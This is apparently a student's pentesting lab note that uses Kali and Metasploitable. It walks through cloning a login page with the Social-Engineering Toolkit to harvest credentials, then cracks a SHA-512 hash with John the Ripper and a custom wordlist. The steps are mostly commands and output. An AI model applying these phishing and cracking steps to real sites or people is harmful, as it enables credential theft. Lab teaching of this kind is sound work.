# Credential Harvesting with SET

**Tags:** #budding #INT245 #security #pentesting

## Session Hijacking, Payload Delivery, SET Toolkit & Reverse Shells

> **Kali Linux (Attacker):** `10.0.2.15`
> **Metasploitable (Victim):** `192.168.56.102`
> **Metasploitable credentials:** `msfadmin / msfadmin`

### ⚠️ IMPORTANT — Network Check First

Your Kali IP is `10.0.2.15` (NAT) and Metasploitable is `192.168.56.102` (Host-Only).
These are **different subnets** — verify Kali can reach Metasploitable:

```bash
# On Kali — check all interfaces
ip a

# Test connectivity
ping -c 3 192.168.56.102
```

> If ping works, use Kali's **192.168.56.x** IP as `LHOST` in all payloads (not 10.0.2.15).

---

## Part A — Credential Harvesting with SET

### Step 1 — Launch SET
```bash
sudo setoolkit
```

Menu navigation:
```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

When prompted:
- **IP to post back to:** `192.168.56.<KALI_HOSTONLY_IP>`
- **URL to clone:** `http://testphp.vulnweb.com/login.php`

### Step 2 — Capture Credentials

On Metasploitable, open Firefox and go to:
```
http://192.168.56.<KALI_HOSTONLY_IP>
```
Enter fake credentials → Submit.

SET displays on Kali:
```
[*] WE GOT A HIT!
POSSIBLE USERNAME FIELD FOUND: username=admin
POSSIBLE PASSWORD FIELD FOUND: password=ABCa123
```

### Step 3 — Generate SHA-512 Hash
```bash
echo -n "ABCa123" | sha512sum | awk '{print $1}'
```

### Step 4 — Store Hash in File
```bash
echo -n "ABCa123" | sha512sum | awk '{print $1}' > ~/captured_hash.txt
cat ~/captured_hash.txt
```

### Step 5 — Create Custom Wordlist
```bash
cat << 'EOF' > ~/custom_wordlist.txt
password
123456
admin
letmein
ABCa123
msfadmin
Password@123
qwerty
EOF
```

### Step 6 — Crack the Hash
```bash
john --format=Raw-SHA512 --wordlist=~/custom_wordlist.txt ~/captured_hash.txt
```

### Step 7 — Display Recovered Password
```bash
john --format=Raw-SHA512 --show ~/captured_hash.txt
```
